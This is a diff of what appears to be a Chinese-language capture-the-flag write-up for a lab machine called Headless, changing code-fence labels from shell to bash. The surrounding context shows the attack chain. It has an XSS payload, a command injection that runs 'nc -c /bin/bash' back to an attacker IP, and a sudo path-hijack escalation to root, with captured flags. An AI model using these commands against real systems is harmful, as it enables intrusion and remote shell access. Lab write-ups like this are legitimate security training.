@@ -10,7 +10,7 @@ Operating System: Linux
 
 ## nmap 信息搜集
 
-```shell title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.11.8"
+```bash title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.11.8"
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
 | ssh-hostkey:
@@ -107,7 +107,7 @@ fname=admin&lname=admin&email=admin%40admin.com&phone=123456789&message=<img src
 
 同时 `nc -lvnp 9999` 开启监听，即可收到
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo python3 -m http.server 9999
 Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
@@ -174,7 +174,7 @@ date=2023-09-15;nc -c /bin/bash 10.10.16.3 9999
 
 ## User - dvir
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [22:52:56] Welcome to pwncat 🐈!
@@ -187,14 +187,14 @@ dvir
 
 ### flag - user
 
-```shell
+```bash
 (remote) dvir@headless:/home/dvir$ cat user.txt
 2fad488ea81fe0a47f534e7350e97913
 ```
 
 ### 环境探测
 
-```shell title="sudo -l"
+```bash title="sudo -l"
 Matching Defaults entries for dvir on headless:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
@@ -204,13 +204,13 @@ User dvir may run the following commands on headless:
 
 查看文件信息
 
-```shell title="file /usr/bin/syscheck"
+```bash title="file /usr/bin/syscheck"
 /usr/bin/syscheck: Bourne-Again shell script, ASCII text executable
 ```
 
 看看脚本代码
 
-```shell title="/usr/bin/syscheck"
+```bash title="/usr/bin/syscheck"
 #!/bin/bash
 
 if ["$EUID" -ne 0]; then
@@ -239,14 +239,14 @@ exit 0
 
 在其中发现 `./initdb.sh` 脚本文件，并且没指定目录的话，此文件可控
 
-```shell
+```bash
 (remote) dvir@headless:/home/dvir$ echo "/bin/bash" > initdb.sh
 (remote) dvir@headless:/home/dvir$ chmod +x initdb.sh
 ```
 
 ## user - root
 
-```shell
+```bash
 (remote) dvir@headless:/home/dvir$ sudo /usr/bin/syscheck
 Last Kernel Modification Time: 01/02/2024 10:05
 Available disk space: 2.0G
@@ -258,7 +258,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 cat root.txt
 4d7c6f680cfe41ebfa19df7b06ac2273
 ```
